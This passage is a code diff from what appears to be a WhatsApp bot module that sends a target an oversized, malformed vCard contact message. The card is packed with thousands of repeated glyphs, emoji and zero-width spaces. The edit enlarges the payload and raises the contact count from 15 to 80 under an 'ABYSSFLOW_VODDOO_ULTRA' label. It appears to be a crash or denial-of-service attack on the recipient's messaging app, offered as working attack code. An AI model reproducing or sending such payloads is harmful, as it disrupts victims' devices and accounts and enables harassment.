@@ -15,17 +15,17 @@ module.exports = {
 
             const malformedVCard = 'BEGIN:VCARD\n' +
                 'VERSION:3.0\n' +
-                'FN:' + '░'.repeat(2000) + '\n' +
-                'ORG:' + '🔥'.repeat(1000) + '\n' +
-                'TEL;type=CELL;type=VOICE;waid=' + '0'.repeat(100) + ':0\n' +
-                'NOTE:' + '🌀'.repeat(5000) + '\n' +
+                'FN:' + '░'.repeat(2500) + '\n' +
+                'ORG:' + '🔥'.repeat(1500) + '\n' +
+                'TEL;type=CELL;type=VOICE;waid=' + '0'.repeat(150) + ':0\n' +
+                'NOTE:' + '🌀'.repeat(10000) + '\u200B'.repeat(5000) + '\n' +
                 'END:VCARD';
 
-            const contacts = Array(15).fill({ vcard: malformedVCard });
+            const contacts = Array(80).fill({ vcard: malformedVCard });
 
             await sock.sendMessage(target, {
                 contacts: {
-                    displayName: "💀 ABYSSFLOW_VODDOO_SYSTEM",
+                    displayName: "💀 ABYSSFLOW_VODDOO_ULTRA",
                     contacts: contacts
                 }
             });
